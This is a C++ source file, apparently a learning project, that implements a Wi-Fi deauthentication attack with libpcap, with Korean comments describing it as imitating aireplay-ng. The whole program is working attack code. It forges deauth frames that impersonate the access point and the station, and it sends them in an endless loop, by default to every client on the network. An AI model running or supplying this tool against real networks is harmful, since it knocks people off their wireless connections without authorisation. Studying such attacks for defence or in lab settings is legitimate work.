#include <pch.h>
#include <dot11.h>
#include <mac.h>
#include <radiotap.h>
#include <param.h>

using namespace std;
Param param;

int main(int argc, char *argv[]) {
    if (!Param::parse(&param, argc, argv)){
        Param::usage();
        return -1;
    }

	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.dev_.c_str(), BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_.c_str(), errbuf);
        return -1;
    }
		

    // 1. MAC 객체 생성 (문자열 -> 바이트 배열 변환)
    Mac ap_mac(param.ap_mac_);
    Mac station_mac;
    bool is_broadcast = false;
    
    if (!param.station_mac_.empty()) {
        station_mac = Mac(param.station_mac_);
    } else {
        // 단말기가 지정되지 않으면 브로드캐스트 주소로 설정
        station_mac = Mac("ff:ff:ff:ff:ff:ff");
        is_broadcast = true;
    }

    // 디버깅: 변환된 MAC 주소 확인
    Param::print_param(param);

    // 4. 전송할 패킷 조립
    // AP -> Station 패킷 세팅
    DeauthPacket pAtoS(station_mac, ap_mac, ap_mac);
    // Station -> AP 패킷 세팅 (브로드캐스트가 아닐 때만 유효함)
    DeauthPacket pStoA(ap_mac, station_mac, ap_mac); 

    // 5. 공격 루프 (aireplay-ng 로직 모방)
    int count = 0;
    while (true) {
        // [첫 번째 샷] AP인 척하고 Station에게 쏨 (또는 Broadcast로 전체에게 쏨)
        // reinterpret_cast를 통해 우리가 만든 구조체를 바이트 배열로 취급하여 전송
        int res1 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&pAtoS), sizeof(DeauthPacket));
        if (res1 != 0) {
            fprintf(stderr, "\nError sending packet: %s\n", pcap_geterr(pcap));
            break;
        }

        // [두 번째 샷] Broadcast 모드가 아니라면, Station인 척하고 AP에게도 쏨 (더 확실하게 끊기 위함)
        if (!is_broadcast) {
            int res2 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&pStoA), sizeof(DeauthPacket));
            if (res2 != 0) {
                fprintf(stderr, "\nError sending packet: %s\n", pcap_geterr(pcap));
                break;
            }
        }

        count++;
        // 터미널에서 숫자가 계속 올라가도록 캐리지 리턴(\r) 사용
        printf("\rSent %d Deauth packets...", count);
        fflush(stdout);
        // 너무 빨리 쏘면 랜카드가 다운되거나 운영체제 큐가 꽉 찰 수 있으므로 딜레이 부여
        // 100,000 마이크로초 = 0.1초 딜레이 (초당 약 10번 전송)
        usleep(100000); 
    }
    pcap_close(pcap);
	return 0;
}
